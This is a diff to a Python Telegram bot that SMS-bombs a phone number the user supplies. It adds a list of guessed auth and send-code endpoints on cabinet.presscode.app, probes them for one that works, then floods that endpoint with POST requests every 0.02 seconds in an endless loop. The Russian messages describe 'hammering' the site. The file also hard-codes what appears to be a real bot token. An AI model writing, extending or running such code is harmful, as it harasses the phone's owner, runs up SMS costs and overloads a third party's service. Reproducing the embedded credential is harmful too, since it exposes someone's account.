@@ -5,12 +5,32 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 
 BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"
 
-BASE_URL = "https://cabinet.presscode.app/api/register"
+BASE_URL = "https://cabinet.presscode.app"
+ENDPOINTS = [
+    "/api/auth/telegram",
+    "/api/login/telegram",
+    "/api/send-code",
+    "/api/request-code",
+    "/api/v1/auth/telegram",
+    "/api/register/telegram",
+]
 
 spam_tasks = {}
+current_endpoint = None
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Отправь номер (например, +380963836766) — начну долбить сайт запросами.")
+    await update.message.reply_text(
+        "Отправь номер — бот сам переберёт возможные эндпоинты и начнёт долбить.\n"
+        "Или задай вручную: /set_endpoint /api/ваш_путь"
+    )
+
+async def set_endpoint(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global current_endpoint
+    if not context.args:
+        await update.message.reply_text("Укажи путь, например: /set_endpoint /api/send-code")
+        return
+    current_endpoint = context.args[0]
+    await update.message.reply_text(f"Эндпоинт установлен: {current_endpoint}")
 
 async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.effective_chat.id
@@ -35,32 +55,45 @@ async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not phone.startswith('+'):
         await update.message.reply_text("Формат: +380...")
         return
-    await update.message.reply_text(f"Запущено на {phone}")
+
+    endpoints_to_try = [current_endpoint] if current_endpoint else ENDPOINTS
+    await update.message.reply_text(f"Запущено на {phone}. Пробую эндпоинты...")
 
     async def spam():
+        nonlocal endpoints_to_try
         count = 0
-        method = 'POST'
+        found = False
         async with aiohttp.ClientSession() as session:
             while True:
-                try:
-                    if method == 'POST':
-                        resp = await session.post(BASE_URL, data={'phone': phone}, timeout=5)
-                    else:
-                        resp = await session.get(BASE_URL, params={'phone': phone}, timeout=5)
-                    status = resp.status
-                    text = await resp.text()
-                    count += 1
-                    if status == 405 and method == 'POST':
-                        method = 'GET'
-                        await context.bot.send_message(chat_id, f"405, переключаю на GET")
-                    else:
-                        await context.bot.send_message(chat_id, f"Попытка #{count}: {status}, {text[:30]}")
+                for endpoint in endpoints_to_try:
+                    url = BASE_URL + endpoint
+                    try:
+                        async with session.post(url, json={'phone': phone}, timeout=5) as resp:
+                            status = resp.status
+                            text = await resp.text()
+                            count += 1
+                            if status == 200 and ('success' in text.lower() or 'code' in text.lower()):
+                                found = True
+                                await context.bot.send_message(chat_id, f"✅ Найден рабочий эндпоинт: {endpoint}")
+                                break
+                            await context.bot.send_message(chat_id, f"Попытка #{count} на {endpoint}: {status}")
+                    except Exception as e:
+                        await context.bot.send_message(chat_id, f"Ошибка на {endpoint}: {str(e)[:30]}")
                     await asyncio.sleep(0.02)
-                except asyncio.CancelledError:
-                    break
-                except Exception as e:
-                    await context.bot.send_message(chat_id, f"Ошибка: {str(e)[:30]}")
-                    await asyncio.sleep(0.02)
+                if found:
+                    # Теперь долбим найденный эндпоинт
+                    while True:
+                        try:
+                            async with session.post(BASE_URL + endpoint, json={'phone': phone}, timeout=5) as resp:
+                                status = resp.status
+                                text = await resp.text()
+                                count += 1
+                                await context.bot.send_message(chat_id, f"Попытка #{count}: {status}, {text[:30]}")
+                        except Exception as e:
+                            await context.bot.send_message(chat_id, f"Ошибка: {str(e)[:30]}")
+                        await asyncio.sleep(0.02)
+                else:
+                    await asyncio.sleep(1)
 
     task = asyncio.create_task(spam())
     spam_tasks[chat_id] = task
@@ -69,6 +102,7 @@ def main():
     app = Application.builder().token(BOT_TOKEN).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("stop", stop_spam))
+    app.add_handler(CommandHandler("set_endpoint", set_endpoint))
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_number))
     app.run_polling()
 
